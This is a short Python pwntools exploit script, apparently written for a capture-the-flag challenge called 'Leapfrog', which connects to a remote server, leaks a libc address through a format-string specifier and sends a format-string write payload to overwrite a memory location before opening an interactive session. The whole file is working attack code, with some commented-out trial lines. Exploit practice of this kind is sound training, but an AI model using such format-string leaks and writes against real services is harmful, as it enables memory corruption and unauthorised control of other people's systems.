#! /usr/bin/env python3
##
# Created for the Leapfrog challenge
# By Amos Ng
##
from pwn import *

# Open tube
t = remote("128.199.98.78", 1800)

# Set times
t.recvuntil("Times to execute?\n")
t.sendline("5")

# Leak LibC
t.sendline("%3$p")
leak = int(t.recvline().strip()[2:], 16)
libc = leak - 0xf6680
t.sendline("0")
print(t.recvline().decode())

# Try to whack token to 0x00
writes = {0x7ffff7b30530: 0}
payload = fmtstr_payload(5, writes, write_size="byte")
t.sendline(payload)
t.interactive()
# print(t.recvline().decode())
# t.sendline("0")
# print(t.recvline().decode())

# # Try to overwrite
# t.sendline("%s")
# print(t.recvline().decode())